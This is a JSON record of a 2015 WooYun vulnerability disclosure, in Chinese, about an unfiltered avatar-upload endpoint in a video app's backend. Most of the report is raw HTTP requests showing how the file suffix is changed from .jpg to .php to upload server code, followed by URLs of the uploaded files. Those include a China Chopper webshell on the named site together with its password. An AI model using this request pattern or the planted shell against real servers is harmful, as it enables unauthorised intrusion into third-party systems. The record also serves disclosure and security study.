{"id": 30933, "wybug_id": "wooyun-2015-0115323", "wybug_title": "云视某APP存在上传导致getshell#8", "wybug_corp": "cdvcloud.com", "wybug_author": "❤", "wybug_date": "2015-05-21 14:33", "wybug_open_date": "2015-05-26 14:34", "wybug_type": "成功的入侵事件", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-26：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： * 详细说明：  光息谷 为云视旗下APP漏洞存在头像上传地址完全没有过滤上传头像时抓包截取数据\nPOST /e/extend/new_client_api/headpic.php HTTP/1.1Host: www.hktv.tvProxy-Connection: closeAccept-Encoding: gzipContent-Type: multipart/form-data; charset=utf-8; boundary=0xKhTmLbOuNdArY-E9ABB41E-6513-421A-A221-9792DEE8FB13Content-Length: 577Connection: closeUser-Agent: åæ¯è°· 2.9 (iPhone; iPhone OS 8.3; zh_CN)--0xKhTmLbOuNdArY-E9ABB41E-6513-421A-A221-9792DEE8FB13Content-Disposition: form-data; name=\"userid\"549--0xKhTmLbOuNdArY-E9ABB41E-6513-421A-A221-9792DEE8FB13Content-Disposition: form-data; name=\"suffix\".jpg--0xKhTmLbOuNdArY-E9ABB41E-6513-421A-A221-9792DEE8FB13Content-Disposition: form-data; name=\"agent\"iphone--0xKhTmLbOuNdArY-E9ABB41E-6513-421A-A221-9792DEE8FB13Content-Disposition: form-data; name=\"userpic\"; filename=\"photo.jpg\"Content-Type: image/jpeg内容--0xKhTmLbOuNdArY-E9ABB41E-6513-421A-A221-9792DEE8FB13--\n改包为：\nPOST /e/extend/new_client_api/headpic.php HTTP/1.1Host: www.hktv.tvProxy-Connection: closeAccept-Encoding: gzipContent-Type: multipart/form-data; charset=utf-8; boundary=0xKhTmLbOuNdArY-E9ABB41E-6513-421A-A221-9792DEE8FB13Content-Length: 577Connection: closeUser-Agent: åæ¯è°· 2.9 (iPhone; iPhone OS 8.3; zh_CN)--0xKhTmLbOuNdArY-E9ABB41E-6513-421A-A221-9792DEE8FB13Content-Disposition: form-data; name=\"userid\"549--0xKhTmLbOuNdArY-E9ABB41E-6513-421A-A221-9792DEE8FB13Content-Disposition: form-data; name=\"suffix\".php--0xKhTmLbOuNdArY-E9ABB41E-6513-421A-A221-9792DEE8FB13Content-Disposition: form-data; name=\"agent\"iphone--0xKhTmLbOuNdArY-E9ABB41E-6513-421A-A221-9792DEE8FB13Content-Disposition: form-data; name=\"userpic\"; filename=\"photo.jpg\"Content-Type: image/jpegtest--0xKhTmLbOuNdArY-E9ABB41E-6513-421A-A221-9792DEE8FB13--\n测试上传:http://www.hktv.tv//d//file//p//2015-05-21//6201283ecfe9f8cb1184c49c033a64de.php成功写入尝试getshell传菜刀试试http://www.hktv.tv//d//file//p//2015-05-21//e080d938fd44aa730adf80def114e0b0.php密码ks\n\n主站和子站一览无余通过配置信息可以看到数据库与站是分离的而且理论上是允许外联的.点到为止到此结束.   漏洞证明：  *   修复方案：  *   版权声明：转载请注明来源 ❤@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-05-26 14:34 厂商回复：  漏洞Rank：4  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}